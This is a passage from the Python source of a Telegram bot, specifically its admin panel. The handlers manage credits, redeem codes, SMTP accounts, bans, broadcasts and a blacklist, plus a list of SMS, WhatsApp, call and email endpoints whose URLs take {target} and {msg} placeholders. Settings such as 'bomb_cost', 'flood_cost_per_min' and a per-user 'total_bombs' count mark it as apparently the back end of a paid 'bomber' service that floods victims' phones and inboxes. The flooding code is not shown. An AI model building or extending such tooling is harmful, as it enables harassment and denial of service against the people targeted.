    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.add_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.add_credits_amt)
async def fsm_add_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not uid or not get_user(uid):
        await state.clear()
        return await m.answer("user not found")
    add_credits(uid, amt)
    log_action(m.from_user.id, "admin_add_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(
        f"✅ +{amt} to <code>{uid}</code>. "
        f"Balance: {get_user(uid)['credits']}",
        reply_markup=admin_kb())


@dp.callback_query(F.data == "a:ded")
async def cb_ded(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.ded_credits_uid)
    await c.message.edit_text("➖ Send target user_id",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.ded_credits_uid)
async def fsm_ded_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.ded_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.ded_credits_amt)
async def fsm_ded_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    u = get_user(uid) if uid else None
    if not u:
        await state.clear()
        return await m.answer("user not found")
    new = max(0, u["credits"] - amt)
    _exec("UPDATE users SET credits=? WHERE user_id=?", (new, uid))
    log_action(m.from_user.id, "admin_ded_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ deducted. Balance: {new}", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:redeem")
async def cb_a_redeem(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC LIMIT 15",
                 fetch="all")
    lines = [
        f"<code>{r['code']}</code> | {r['amount']}c | "
        f"{r['used']}/{r['max_uses']} | "
        f"{'✅' if r['active'] else '🚫'}" for r in rows
    ]
    await c.message.edit_text(
        "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Create",
                                  callback_data="a:redeem_new")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.redeem_amount)
    await c.message.edit_text("Send credit amount",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.redeem_amount)
async def fsm_redeem_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    await state.update_data(amount=amt)
    await state.set_state(AdminFSM.redeem_uses)
    await m.answer("Send max uses (0 = unlimited)")


@dp.message(AdminFSM.redeem_uses)
async def fsm_redeem_uses(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        uses = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    if uses <= 0:
        uses = 10 ** 9
    d = await state.get_data()
    code = gen_code(10)
    _exec("INSERT INTO redeem_codes(code,amount,max_uses,created_by,"
          "created_at) VALUES(?,?,?,?,?)",
          (code, d["amount"], uses, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_create_code",
               f"{code} amt={d['amount']}")
    await state.clear()
    await m.answer(f"✅ <code>{code}</code> ({d['amount']}c, {uses} uses)",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:apis")
async def cb_apis(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                   fetch="one")["c"]
    rows = _exec("SELECT * FROM apis ORDER BY category, id LIMIT 40",
                 fetch="all")
    lines = [
        f"#{r['id']} [{r['category']}] <b>{r['name']}</b> "
        f"{'✅' if r['active'] else '🚫'} "
        f"ok:{r['ok_count']} fail:{r['fail_count']}" for r in rows
    ]
    await c.message.edit_text(
        f"🔌 <b>APIs</b> — {active}/{total} active\n\n" +
        ("\n".join(lines) or "none") +
        "\n\n<i>First 40 shown.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:api_new"),
             InlineKeyboardButton(text="🗑 Del",
                                  callback_data="a:api_del")],
            [InlineKeyboardButton(text="🔁 Toggle",
                                  callback_data="a:api_tog"),
             InlineKeyboardButton(text="🔄 Reseed",
                                  callback_data="a:api_reseed")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:api_reseed")
async def cb_api_reseed(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    seed_all_endpoints(force_refresh=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    await c.answer(f"✅ reseeded ({total} endpoints)", show_alert=True)


@dp.callback_query(F.data == "a:api_new")
async def cb_api_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.api_name)
    await c.message.edit_text("Send API name.", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.api_name)
async def fsm_api_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(name=m.text.strip())
    await state.set_state(AdminFSM.api_category)
    await m.answer("Category: sms / whatsapp / call / email / legacy")


@dp.message(AdminFSM.api_category)
async def fsm_api_category(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    cat = m.text.strip().lower()
    if cat not in ("sms", "whatsapp", "call", "email", "legacy"):
        return await m.answer("pick: sms whatsapp call email legacy")
    await state.update_data(category=cat)
    await state.set_state(AdminFSM.api_url)
    await m.answer("Send URL. Use {target} and {msg}.")


@dp.message(AdminFSM.api_url)
async def fsm_api_url(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(url=m.text.strip())
    await state.set_state(AdminFSM.api_method)
    await m.answer("Method: GET / POST / PUT")


@dp.message(AdminFSM.api_method)
async def fsm_api_method(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    meth = m.text.strip().upper()
    if meth not in ("GET", "POST", "PUT"):
        return await m.answer("GET / POST / PUT")
    await state.update_data(method=meth)
    await state.set_state(AdminFSM.api_body)
    await m.answer("Body (POST/PUT only, else '-')")


@dp.message(AdminFSM.api_body)
async def fsm_api_body(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(
        body="" if m.text.strip() == "-" else m.text.strip())
    await state.set_state(AdminFSM.api_headers)
    await m.answer("Headers, one per line 'Key: Value' (or '-')")


@dp.message(AdminFSM.api_headers)
async def fsm_api_headers(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    headers = "" if m.text.strip() == "-" else m.text.strip()
    d = await state.get_data()
    _exec("INSERT OR REPLACE INTO apis(name,channel,category,url,method,"
          "body,headers,created_at) VALUES(?,?,?,?,?,?,?,?)",
          (d["name"], "http", d["category"], d["url"], d["method"],
           d["body"], headers, int(time.time())))
    log_action(m.from_user.id, "admin_add_api", d["name"])
    await state.clear()
    await m.answer("✅ API added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:api_del")
async def cb_api_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_del")
    await c.message.edit_text("Send API ID to delete.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:api_tog")
async def cb_api_tog(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_tog")
    await c.message.edit_text("Send API ID to toggle.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:smtp")
async def cb_smtp(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM smtp_accounts ORDER BY id", fetch="all")
    lines = [
        f"#{r['id']} <code>{r['username']}</code> @ "
        f"{r['host']}:{r['port']} "
        f"{'✅' if r['active'] else '🚫'} "
        f"ok:{r['ok_count']} fail:{r['fail_count']}" for r in rows
    ]
    await c.message.edit_text(
        "📧 <b>SMTP Accounts</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add SMTP",
                                  callback_data="a:smtp_new")],
            [InlineKeyboardButton(text="🗑 Del by ID",
                                  callback_data="a:smtp_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:smtp_new")
async def cb_smtp_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.smtp_host)
    await c.message.edit_text("SMTP host (e.g. smtp.gmail.com)",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.smtp_host)
async def fsm_smtp_host(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(host=m.text.strip())
    await state.set_state(AdminFSM.smtp_port)
    await m.answer("Port (587 or 465)")


@dp.message(AdminFSM.smtp_port)
async def fsm_smtp_port(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        port = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    await state.update_data(port=port)
    await state.set_state(AdminFSM.smtp_user)
    await m.answer("Username (full email for Gmail)")


@dp.message(AdminFSM.smtp_user)
async def fsm_smtp_user(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(username=m.text.strip())
    await state.set_state(AdminFSM.smtp_pass)
    await m.answer("Password / app password")


@dp.message(AdminFSM.smtp_pass)
async def fsm_smtp_pass(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(password=m.text.strip())
    await state.set_state(AdminFSM.smtp_name)
    await m.answer("From name (e.g. Support)")


@dp.message(AdminFSM.smtp_name)
async def fsm_smtp_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    _exec("INSERT INTO smtp_accounts(host,port,username,password,from_name) "
          "VALUES(?,?,?,?,?)",
          (d["host"], d["port"], d["username"], d["password"], m.text.strip()))
    log_action(m.from_user.id, "admin_add_smtp", d["username"])
    await state.clear()
    await m.answer("✅ SMTP added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:smtp_del")
async def cb_smtp_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="smtp_del")
    await c.message.edit_text("Send SMTP ID to delete.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:settings")
async def cb_settings(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    keys = ["bomb_cost", "max_count", "cooldown", "concurrency",
            "daily_bonus", "referral_bonus", "maintenance", "country_code",
            "flood_cost_per_min"]
    txt = "⚙️ <b>Settings</b>\n\n" + "\n".join(
        f"{k}: <b>{setting(k)}</b>" for k in keys)
    rows = []
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(text=keys[i],
                                    callback_data=f"a:set:{keys[i]}")]
        if i + 1 < len(keys):
            row.append(InlineKeyboardButton(
                text=keys[i + 1], callback_data=f"a:set:{keys[i + 1]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")])
    await c.message.edit_text(
        txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_edit(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    key = c.data.split(":", 2)[2]
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="setting", key=key)
    await c.message.edit_text(f"Send new value for <b>{key}</b>",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.edit_setting)
async def fsm_edit_setting(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    mode = d.get("mode")

    if mode == "setting":
        key = d.get("key")
        val = m.text.strip()
        numeric_keys = {"bomb_cost", "max_count", "cooldown", "concurrency",
                        "daily_bonus", "referral_bonus", "maintenance",
                        "flood_cost_per_min"}
        if key in numeric_keys:
            try:
                int(val)
            except ValueError:
                return await m.answer("numeric required")
        set_setting(key, val)
        await state.clear()
        return await m.answer(f"✅ {key} = {val}", reply_markup=admin_kb())

    if mode == "api_del":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("DELETE FROM apis WHERE id=?", (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "api_tog":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("UPDATE apis SET active=1-active, fail_streak=0 WHERE id=?",
              (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ toggled", reply_markup=admin_kb())

    if mode == "smtp_del":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("DELETE FROM smtp_accounts WHERE id=?",
              (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "black_del":
        target = m.text.strip()
        _exec("DELETE FROM blacklist WHERE target=?", (target,))
        await state.clear()
        return await m.answer(f"✅ removed <code>{target}</code>",
                              reply_markup=admin_kb())

    await state.clear()
    return await m.answer("⚠️ state lost, reset.",
                          reply_markup=admin_kb())


@dp.callback_query(F.data == "a:find")
async def cb_find(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.find_user)
    await c.message.edit_text("Send user_id.", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.find_user)
async def fsm_find(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    u = get_user(uid)
    if not u:
        return await m.answer("not found")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🚫 Ban" if not u["banned"] else "✅ Unban",
            callback_data=f"a:ban:{uid}")],
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]])
    await m.answer(
        f"👤 <code>{uid}</code>\n"
        f"@{u['username'] or '-'} | {u['first_name']}\n"
        f"💳 {u['credits']} | 💥 {u['total_bombs']}\n"
        f"⭐ vip cost: {u['vip_cost']}\n"
        f"Status: {'🚫 banned' if u['banned'] else '✅ active'}",
        reply_markup=kb)
    await state.clear()


@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    uid = int(c.data.split(":")[2])
    _exec("UPDATE users SET banned=1-banned WHERE user_id=?", (uid,))
    log_action(c.from_user.id, "admin_toggle_ban", str(uid))
    await c.answer("toggled", show_alert=True)


@dp.callback_query(F.data == "a:bcast")
async def cb_bcast(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.broadcast)
    await c.message.edit_text("Send broadcast message.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.broadcast)
async def fsm_broadcast(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.clear()
    asyncio.create_task(_do_broadcast(m))


async def _do_broadcast(m: types.Message):
    users = _exec("SELECT user_id FROM users WHERE banned=0", fetch="all")
    sent = failed = 0
    status = await m.answer(f"📢 Broadcasting to {len(users)} users...")
    for row in users:
        try:
            await bot.send_message(row["user_id"], m.html_text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    try:
        await status.edit_text(f"✅ Sent {sent}, failed {failed}")
    except Exception:
        pass
    log_action(m.from_user.id, "admin_broadcast",
               f"sent={sent} failed={failed}")


@dp.callback_query(F.data == "a:black")
async def cb_black(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC LIMIT 30",
                 fetch="all")
    lines = [f"• <code>{r['target']}</code>" for r in rows]
    await c.message.edit_text(
        "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add",
                                  callback_data="a:black_add")],
            [InlineKeyboardButton(text="🗑 Remove",
                                  callback_data="a:black_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await c.message.edit_text("Send target to blacklist.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.blacklist_add)
async def fsm_black_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    t = m.text.strip()
    _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) "
          "VALUES(?,?,?)", (t, m.from_user.id, int(time.time())))
    await state.clear()
    await m.answer(f"✅ blacklisted <code>{t}</code>",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="black_del")
    await c.message.edit_text("Send target to remove.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:vip")
async def cb_vip(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.vip_uid)
    await c.message.edit_text("⭐ Send user_id.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.vip_uid)
async def fsm_vip_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.vip_cost)
    await m.answer("Send VIP cost (0 = default)")


@dp.message(AdminFSM.vip_cost)
async def fsm_vip_cost(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        cost = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not get_user(uid):
        await state.clear()
        return await m.answer("user not found")
    _exec("UPDATE users SET vip_cost=? WHERE user_id=?", (cost, uid))
    await state.clear()
    await m.answer(f"✅ vip cost for <code>{uid}</code> = {cost}",
                   reply_markup=admin_kb())


@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 15
    total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        lines.append(f"{t} <code>{r['user_id']}</code> "
                     f"{r['action']} {r['detail'][:40]}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:logs:{page-1}"))
    if page < max_p:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:logs:{page+1}"))
    kb = ([nav] if nav else []) + \
         [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(
        f"📋 <b>Logs</b> ({page+1}/{max_p+1})\n\n" +
        ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:export")
async def cb_export(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM users", fetch="all")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id", "username", "first_name", "credits", "banned",
                "total_bombs", "ref_count", "vip_cost", "created_at"])
    for r in rows:
        w.writerow([r["user_id"], r["username"], r["first_name"],
                    r["credits"], r["banned"], r["total_bombs"],
                    r["ref_count"], r["vip_cost"], r["created_at"]])
    await c.message.answer_document(
        BufferedInputFile(buf.getvalue().encode(), filename="users.csv"),
        caption=f"📤 {len(rows)} users exported")
    await c.answer()


# ─────────────────────────────────────────────────────────────
# HEALTH SERVER
# ─────────────────────────────────────────────────────────────
async def _health_handler(request):
    return aiohttp.web.Response(
        text="Bot is running",
        content_type="text/plain",
        status=200)


async def _run_health_server():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health_handler)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    try:
        site = aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT)
        await site.start()
        log.info("health server on 0.0.0.0:%d", PORT)
    except OSError as e:
        log.error("health bind failed: %s", e)
        await runner.cleanup()
        return
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


# ─────────────────────────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────────────────────────
async def _periodic_prune():
    while True:
        try:
            prune_logs()
        except Exception:
            log.exception("prune failed")
        await asyncio.sleep(6 * 3600)


async def main():
    init_db()
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                   fetch="one")["c"]
    log.info("bot starting | port=%d | endpoints=%d active=%d",
             PORT, total, active)
    await bot.delete_webhook(drop_pending_updates=True)

    prune_task = asyncio.create_task(_periodic_prune())
    health_task = asyncio.create_task(_run_health_server())

    try:
        await dp.start_polling(bot)
    finally:
        for t in (health_task, prune_task):
            if t and not t.done():
                t.cancel()
        for t in (health_task, prune_task):
            try:
                await t
            except (asyncio.CancelledError, Exception):
                pass
        try:
            await bot.session.close()
        except Exception:
            pass
        try:
            _conn.close()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass